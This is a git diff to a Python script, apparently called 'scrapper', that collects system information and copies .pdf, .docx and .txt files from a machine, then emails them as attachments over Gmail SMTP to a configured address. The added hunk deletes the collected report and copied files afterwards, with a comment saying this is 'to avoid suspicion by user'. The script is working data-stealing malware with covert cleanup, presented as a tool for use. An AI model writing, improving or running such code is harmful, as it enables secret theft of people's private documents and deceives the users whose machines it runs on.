@@ -11,12 +11,12 @@ from email.mime.text import MIMEText
 from email.mime.application import MIMEApplication
 
 # Set to False if you just want the system_info.txt instead of having an email sent as well
-enable_email = True
+enable_email = False
 
 # Provide email configuration (replace with actual values)
 sender_email = "johndoe029501@gmail.com"
-receiver_email = ""
-password = ""
+receiver_email = "" # Needs to be filled in
+password = "" # Needs to be filled in (app specific password)
 smtp_server = "smtp.gmail.com"
 smtp_port = 587
 max_attachment_size_mb = 25  # Gmail attachment size limit in MB
@@ -119,7 +119,7 @@ def send_email_with_attachments(sender_email, receiver_email, password, smtp_ser
             message["From"] = sender_email
             message["To"] = receiver_email
             message["Subject"] = f"{subject} - Part {part_number}"
-            message.attach(MIMEText("Please find attached the system information report.", "plain"))
+            message.attach(MIMEText("Please find attached the system information report along with any .pdf, .docx, or .txt files found on the system.", "plain"))
 
         if not system_info_added:
             with open(system_info_path, "rb") as file:
@@ -236,6 +236,20 @@ def scrapper():
             return
         
         send_email_with_attachments(sender_email, receiver_email, password, smtp_server, smtp_port, attachments, "System Information Report", system_info_dir)
+
+        # Cleanup: Remove system_info.txt and copied_files directory to avoid suspicion by user
+        try:
+            # Remove system_info.txt
+            if os.path.exists(system_info_dir):
+                os.remove(system_info_dir)
+            
+            # Remove copied_files directory and all its contents
+            if os.path.exists(copied_files_dir):
+                shutil.rmtree(copied_files_dir)
+            
+            print("Cleanup completed.")
+        except Exception as e:
+            print(f"Error during cleanup: {e}")
 
 if __name__ == "__main__":
     scrapper()
